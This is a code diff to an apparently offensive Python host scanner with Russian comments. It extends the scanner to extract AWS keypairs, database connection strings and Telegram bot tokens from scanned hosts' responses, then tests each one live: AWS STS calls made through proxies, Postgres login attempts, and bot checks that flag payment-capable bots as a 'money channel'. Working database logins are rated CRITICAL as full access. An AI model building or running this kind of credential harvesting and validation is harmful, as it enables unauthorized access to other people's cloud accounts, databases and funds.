@@ -12,9 +12,13 @@ from concurrent.futures import ThreadPoolExecutor
 import aiohttp
 
 from .ai_verify import (
+    check_dsn,
     extract_ai_keys,
+    extract_aws_keypairs,
+    extract_dsns,
     extract_telegram_bots,
     verify_ai_key,
+    verify_aws_keypair,
     verify_telegram_bot,
 )
 from .config import Settings
@@ -108,7 +112,6 @@ SENSITIVE_PATTERNS = {
     "keystore_json": re.compile(r'"cipher"\s*:\s*"?aes-', re.I),
     # HIGH - SMTP/DB credentials
     "smtp_password": re.compile(r'"(?:smtp_pass|smtp_password)"\s*:\s*"[^"]{4,}"', re.I),
-    "database_url": re.compile(r'"(?:database_url|db_url|dsn|connection_string)"\s*:\s*"[a-z][a-z0-9+.-]*://[^"]{4,}"', re.I),
     "credential": re.compile(r'"(?:credential|credentials)"\s*:\s*"[^"]{8,}"', re.I),
     # HIGH - generic access_token (not Facebook-specific)
     "access_token": re.compile(r'"access_token"\s*:\s*"[^"]{20,}"', re.I),
@@ -247,6 +250,10 @@ SEVERITY_MAP = {
     "gitlab_token": "HIGH",
     "telegram_bot": "HIGH",
     "telegram_bot_valid": "HIGH",
+    "telegram_bot_money": "CRITICAL",
+    "aws_key_valid": "HIGH",
+    "dsn_reachable": "MEDIUM",
+    "dsn_auth_ok": "CRITICAL",
     "slack_token": "HIGH",
     "discord_token": "HIGH",
     "discord_webhook": "MEDIUM",
@@ -447,6 +454,8 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             # AI-ключи, найденные в ответах (key -> provider), для верификации
             ai_keys_found: dict[str, str] = {}
             telegram_bots_found: set[str] = set()
+            aws_keypairs_found: set[tuple[str, str]] = set()
+            dsns_found: set[str] = set()
 
             # 4. Тестируем эндпоинты
             for path_template, methods in paths.items():
@@ -504,12 +513,24 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                 ep_data["patterns"] = patterns
                                 all_patterns.extend(patterns)
 
-                                # Собираем AI-ключи и telegram-ботов для проверки
+                                # Собираем AI-ключи, ботов, AWS-ключи и DSN для проверки
                                 if cfg.ai_key_checks:
                                     for prov, k in extract_ai_keys(body[:100_000]):
                                         ai_keys_found.setdefault(k, prov)
                                 if cfg.telegram_bot_checks:
                                     telegram_bots_found.update(extract_telegram_bots(body[:100_000]))
+                                if cfg.aws_key_checks:
+                                    for access_key, secret in extract_aws_keypairs(body[:100_000]):
+                                        if (
+                                            not is_aws_example_key(access_key)
+                                            and not secret.endswith('EXAMPLEKEY')
+                                        ):
+                                            aws_keypairs_found.add((access_key, secret))
+                                if cfg.dsn_checks:
+                                    dsns_found.update(
+                                        d for d in extract_dsns(body[:100_000])
+                                        if not is_placeholder_dsn(d)
+                                    )
 
                                 if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                                     max_severity = sev
@@ -563,7 +584,8 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                         if severity_order.get(max_severity, 0) < 2:
                             max_severity = "HIGH"
 
-            # Проверка telegram-ботов: жив ли бот (getMe, через прокси)
+            # Проверка telegram-ботов: жив ли бот (getMe, через прокси);
+            # у живых ищем платёжные команды - бот-касса = канал денег
             telegram_checks: list[dict[str, Any]] = []
             if cfg.telegram_bot_checks and telegram_bots_found:
                 for token in list(telegram_bots_found)[: cfg.telegram_bot_max]:
@@ -573,9 +595,45 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                     )
                     telegram_checks.append(chk)
                     if chk["status"] == "valid":
-                        all_patterns.append("telegram_bot_valid")
+                        if chk.get("money"):
+                            # Живой бот с платёжными командами (вывод/баланс)
+                            all_patterns.append("telegram_bot_money")
+                            if severity_order.get(max_severity, 0) < 3:
+                                max_severity = "CRITICAL"
+                        else:
+                            all_patterns.append("telegram_bot_valid")
+                            if severity_order.get(max_severity, 0) < 2:
+                                max_severity = "HIGH"
+
+            # Проверка AWS-пар: STS GetCallerIdentity (SigV4, через прокси)
+            aws_key_checks: list[dict[str, Any]] = []
+            if cfg.aws_key_checks and aws_keypairs_found:
+                for access_key, secret in list(aws_keypairs_found)[: cfg.aws_key_max]:
+                    chk = await verify_aws_keypair(
+                        session, access_key, secret,
+                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
+                    )
+                    aws_key_checks.append(chk)
+                    if chk["status"] == "valid":
+                        all_patterns.append("aws_key_valid")
                         if severity_order.get(max_severity, 0) < 2:
                             max_severity = "HIGH"
+
+            # Проверка DSN: доступен ли хост, работают ли креды (postgres)
+            dsn_checks: list[dict[str, Any]] = []
+            if cfg.dsn_checks and dsns_found:
+                for d in list(dsns_found)[: cfg.dsn_max]:
+                    chk = await check_dsn(d, timeout_s=max(cfg.check_timeout, 5))
+                    dsn_checks.append(chk)
+                    if chk["status"] == "auth_ok":
+                        # Креды работают - полный доступ к БД
+                        all_patterns.append("dsn_auth_ok")
+                        if severity_order.get(max_severity, 0) < 3:
+                            max_severity = "CRITICAL"
+                    elif chk["status"] == "reachable":
+                        all_patterns.append("dsn_reachable")
+                        if severity_order.get(max_severity, 0) < 1:
+                            max_severity = "MEDIUM"
 
             result.endpoints = endpoints_data
             result.data_patterns = list(set(all_patterns))
@@ -608,6 +666,8 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 "withdraw_capable": bool(withdraw_eps),
                 "ai_key_checks": ai_key_checks,
                 "telegram_checks": telegram_checks,
+                "aws_key_checks": aws_key_checks,
+                "dsn_checks": dsn_checks,
             }
 
     except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
